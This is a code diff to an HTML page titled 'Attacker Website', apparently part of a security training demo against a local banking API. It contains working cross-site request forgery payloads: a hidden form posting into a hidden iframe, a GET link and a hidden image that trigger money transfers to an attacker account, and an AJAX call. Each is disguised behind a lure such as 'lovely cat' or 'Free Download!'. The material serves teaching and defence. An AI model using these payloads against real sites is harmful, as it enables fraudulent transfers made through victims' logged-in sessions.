@@ -10,6 +10,23 @@
 
 <h2 style="color: red">Attacker Website</h2>
 
+<a href="http://localhost:8080/api/victim/transfer-over-get-BAD?recipientName=ATTACKER&recipientIBAN=ABC&amount=100" target="hack" onclick="catimg.style.display='block'">Click here to see a lovely cat!</a>
+    <img src="cat.png" name="catimg" style="display: none">
+<br/>
+
+<iframe  style="display: none" id="hiddenIframe" name="hiddenIframe"></iframe>
+<div style="border:2px solid red; background-color: #fdc2c2">
+    <h4 style="color:red;">Transfer Money (via FORM POST) --- CSRF: Cross Site Request Forging</h4>
+    <form method="post" action="http://localhost:8080/api/victim/transfer-form" target="hiddenIframe">
+        <input type="hidden" name="recipientFullName" value="Attacker" />
+        <input type="hidden" name="recipientIban" value="ATTACKERIBAN13123" />
+        <input type="hidden" name="amount" value="100" />
+        <input type="submit" value="Free Download!">
+    </form>
+</div>
+<br />
+
+
 <div style="border:2px solid red; background: #fdc2c2">
     <h4 style="color: red">Transfer Money (via AJAX) --- CORS - XSS: Cross Site Scripting</h4>
     <input type="button" value="Download Free Stuff" onclick="transferAmount()">
@@ -17,10 +34,6 @@
 
 
 <script type="text/javascript">
-
-
-
-
     function transferAmount() {
         $.ajax({
             url:"http://localhost:8080/api/victim/transfer-rest",
@@ -46,20 +59,7 @@
     });
 </script>
 
-<br/>
-<iframe  style="display: none" id="hiddenIframe" name="hiddenIframe"></iframe>
-<div style="border:2px solid red; background-color: #fdc2c2">
-    <h4 style="color:red;">Transfer Money (via FORM POST) --- CSRF: Cross Site Request Forging</h4>
-    <form method="post" action="http://localhost:8080/api/victim/transfer-form" target="hiddenIframe">
-        <input type="hidden" name="recipientFullName" value="Attacker" />
-        <input type="hidden" name="recipientIban" value="ATTACKERIBAN13123" />
-        <input type="hidden" name="amount" value="100" />
-        <input type="submit" value="Free Download!">
-    </form>
-</div>
 
-<a href="http://localhost:8080/api/victim/transfer-over-get-BAD?recipientName=ATTACKER&recipientIBAN=ABC&amount=100" target="hack">See a lovely cat!</a>
-</br />
 <img src="http://localhost:8080/api/victim/transfer-over-get-BAD?recipientName=ATTACKER&recipientIBAN=ABC&amount=100" style="display: none" />
 </br />
 <a href="http://localhost:8080/api/user/current" target="hack">You won $1000! Click do redeem!</a>
